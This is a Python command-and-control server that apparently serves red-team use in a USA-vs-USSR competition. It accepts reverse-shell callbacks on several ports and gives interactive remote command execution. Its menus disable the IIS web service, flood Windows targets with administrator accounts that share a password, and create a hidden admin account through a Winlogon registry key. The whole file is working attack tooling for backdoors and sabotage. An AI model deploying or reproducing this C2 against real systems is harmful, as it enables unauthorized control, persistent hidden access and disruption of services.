import socket
import time
import random
import threading
import argparse

PORTS = [80, 443, 8080, 3306, 4444, 5985, 8443]

NAME_POOLS = {
    "USA": [
        "james_brooks", "michael_reed", "david_lane", "robert_hayes",
        "william_ford", "thomas_grant", "charles_bell", "daniel_shaw",
        "matthew_cole", "andrew_ross", "ryan_price", "kevin_hunt",
        "brian_stone", "steven_wade", "paul_bishop", "mark_burns",
        "jason_marsh", "eric_norris", "scott_quinn", "jeffrey_page"
    ],
    "USSR": [
        "nikolai_petrov", "ivan_sorokin", "dmitri_volkov", "alexei_morozov",
        "sergei_kozlov", "pavel_novikov", "mikhail_lebedev", "andrei_popov",
        "boris_fedorov", "viktor_orlov", "yuri_sobolev", "konstantin_zhukov",
        "roman_nikitin", "igor_kuznetsov", "oleg_stepanov", "evgeni_frolov",
        "anatoli_baranov", "vladislav_egorov", "georgi_semyonov", "pyotr_kulikov"
    ]
}

# ── Session Registry ────────────────────────────────────────────────────────
# Stores all active connections keyed by IP
# { "10.100.2.10": { "conn": <socket>, "port": 80, "team": "USA" } }

sessions = {}
sessions_lock = threading.Lock()

def register_session(ip, conn, port):
    with sessions_lock:
        if ip in sessions:
            # Close old stale connection and replace it
            try:
                sessions[ip]["conn"].close()
            except Exception:
                pass
        sessions[ip] = {"conn": conn, "port": port, "team": guess_team(ip)}
        print(f"\n[+] New session: {ip} on port {port} (team: {guess_team(ip)})")
        print("    Type 'sessions' at any prompt to see all active connections.")

def guess_team(ip):
    """Infer team from IP subnet."""
    if ip.startswith("10.100.2."):
        return "USA"
    elif ip.startswith("10.100.3."):
        return "USSR"
    return "UNKNOWN"

def remove_session(ip):
    with sessions_lock:
        if ip in sessions:
            del sessions[ip]
            print(f"[-] Session dropped: {ip}")

# ── Port Listeners ───────────────────────────────────────────────────────────

def accept_loop(server, port):
    """Continuously accept new connections on a given port."""
    while True:
        try:
            conn, addr = server.accept()
            ip = addr[0]
            register_session(ip, conn, port)
        except Exception:
            break

def start_listeners():
    """Spin up one listening thread per port."""
    for port in PORTS:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", port))
            server.listen(10)
            t = threading.Thread(target=accept_loop, args=(server, port), daemon=True)
            t.start()
            print(f"[*] Listener started on port {port}")
        except Exception as e:
            print(f"[!] Could not bind port {port}: {e}")

# ── Command Execution ────────────────────────────────────────────────────────

def send_command(conn, command):
    try:
        conn.send((command + "\n").encode("utf-8"))
        time.sleep(3)
        response = b""
        conn.settimeout(5)
        try:
            while True:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        return response.decode("utf-8", errors="ignore")
    except Exception as e:
        return f"[!] Send failed: {e}"

# ── User Tools ───────────────────────────────────────────────────────────────

def make_user_command(username, admin=False):
    password = "Welcome1!"
    cmd = (
        f'New-LocalUser -Name "{username}" '
        f'-Password (ConvertTo-SecureString "{password}" -AsPlainText -Force) '
        f'-PasswordNeverExpires'
    )
    if admin:
        cmd += f'; Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
    return cmd

def get_name_queue(team):
    pool = NAME_POOLS.get(team, NAME_POOLS["USA"])[:]
    random.shuffle(pool)
    return pool

def flood_users(conn, team, count, delay=0):
    queue = get_name_queue(team)
    used = []
    created = 0
    print(f"\n[*] Starting user drop — {count} users, {delay}s delay each\n")
    while created < count:
        if not queue:
            print("[*] Queue exhausted, reshuffling...")
            queue = [n for n in get_name_queue(team) if n not in used[-10:]]
        username = queue.pop(0)
        used.append(username)
        cmd = make_user_command(username, admin=True)
        print(f"[+] Creating ({created + 1}/{count}): {username}")
        result = send_command(conn, cmd)
        if result.strip():
            print(result)
        created += 1
        if delay > 0 and created < count:
            print(f"[*] Waiting {delay}s...")
            time.sleep(delay)
    print(f"\n[+] Done. {count} users created.")

def create_hidden_user(conn):
    username = "svc_diag"
    password = "Diag$2024!"
    cmd_create = (
        f'New-LocalUser -Name "{username}" '
        f'-Password (ConvertTo-SecureString "{password}" -AsPlainText -Force) '
        f'-PasswordNeverExpires'
    )
    cmd_admin = f'Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
    cmd_hide  = (
        f'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT'
        f'\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" '
        f'-Name "{username}" -Value 0 -PropertyType DWord -Force'
    )
    print(f"\n[*] Creating hidden user: {username}")
    print(send_command(conn, cmd_create))
    print(send_command(conn, cmd_admin))
    print(send_command(conn, cmd_hide))
    print(f"[+] Hidden user '{username}' created | password: {password}")

# ── Menus ────────────────────────────────────────────────────────────────────

def user_flood_menu(conn, team):
    while True:
        print(f"\n--- User Flood Menu [{team}] ---")
        print("  [1] Drop 10 users instantly")
        print("  [2] Slow drip — 1 user every 5 min (up to 5)")
        print("  [3] Create 1 hidden admin user")
        print("  [0] Back")
        choice = input("Select> ").strip()
        if choice == "0":
            break
        elif choice == "1":
            flood_users(conn, team, count=10, delay=0)
        elif choice == "2":
            threading.Thread(
                target=flood_users,
                args=(conn, team, 5, 300),
                daemon=True
            ).start()
            print("[*] Slow drip running in background.")
        elif choice == "3":
            create_hidden_user(conn)

def automation_menu(conn, team):
    automations = {
        "1": ("Disable IIS",       "Stop-Service -Name W3SVC; Set-Service -Name W3SVC -StartupType Disabled"),
        "2": ("Check IIS status",  "Get-Service -Name W3SVC | Select-Object Status"),
        "3": ("Whoami + hostname", "whoami; hostname"),
        "4": ("List local admins", "Get-LocalGroupMember -Group Administrators"),
        "5": ("User flood",        None),
    }
    while True:
        print(f"\n--- Automation Menu [{team}] ---")
        for key, (label, _) in automations.items():
            print(f"  [{key}] {label}")
        print("  [0] Back")
        choice = input("Select> ").strip()
        if choice == "0":
            break
        elif choice == "5":
            user_flood_menu(conn, team)
        elif choice in automations:
            label, cmd = automations[choice]
            print(f"\n[*] Running: {label}")
            print(send_command(conn, cmd))

def interactive_mode(conn, ip):
    print(f"[*] Interactive shell on {ip}. Type 'back' to return.\n")
    while True:
        cmd = input(f"{ip}> ").strip()
        if cmd.lower() == "back":
            break
        if cmd:
            print(send_command(conn, cmd))

def session_menu(ip):
    """Full interaction menu for one selected session."""
    with sessions_lock:
        if ip not in sessions:
            print(f"[!] No active session for {ip}")
            return
        session = sessions[ip]

    conn = session["conn"]
    team = session["team"]
    port = session["port"]

    while True:
        print(f"\n=== Session: {ip} | Team: {team} | Port: {port} ===")
        print("  [1] Interactive shell")
        print("  [2] Automations")
        print("  [3] Back to session list")
        choice = input("Select> ").strip()
        if choice == "1":
            interactive_mode(conn, ip)
        elif choice == "2":
            automation_menu(conn, team)
        elif choice == "3":
            break

def print_sessions():
    with sessions_lock:
        if not sessions:
            print("\n[!] No active sessions.")
            return
        print("\n--- Active Sessions ---")
        for i, (ip, data) in enumerate(sessions.items(), 1):
            print(f"  [{i}] {ip:15s}  port: {data['port']}  team: {data['team']}")

def sessions_menu():
    """Top level — pick a session or wait for one."""
    while True:
        print("\n======== C2 SESSIONS ========")
        print_sessions()
        print("\n  [i]  Interact with a session (enter IP)")
        print("  [r]  Refresh session list")
        print("  [q]  Quit")
        choice = input("\nC2> ").strip().lower()

        if choice == "q":
            print("[*] Exiting.")
            break
        elif choice == "r":
            continue
        elif choice == "i":
            ip = input("Enter target IP> ").strip()
            with sessions_lock:
                if ip not in sessions:
                    print(f"[!] No session for {ip}. Check IP or wait for callback.")
                    continue
            session_menu(ip)

# ── Entry Point ───────────────────────────────────────────────────────────────

def main():
    print("""
 ██████╗██████╗ 
██╔════╝╚════██╗
██║      █████╔╝
██║     ██╔═══╝ 
╚██████╗███████╗
 ╚═════╝╚══════╝  Multi-Session C2
    """)

    print("[*] Starting listeners...")
    start_listeners()
    print(f"[*] Listening on ports: {PORTS}")
    print("[*] Waiting for callbacks...\n")

    sessions_menu()

if __name__ == "__main__":
    main()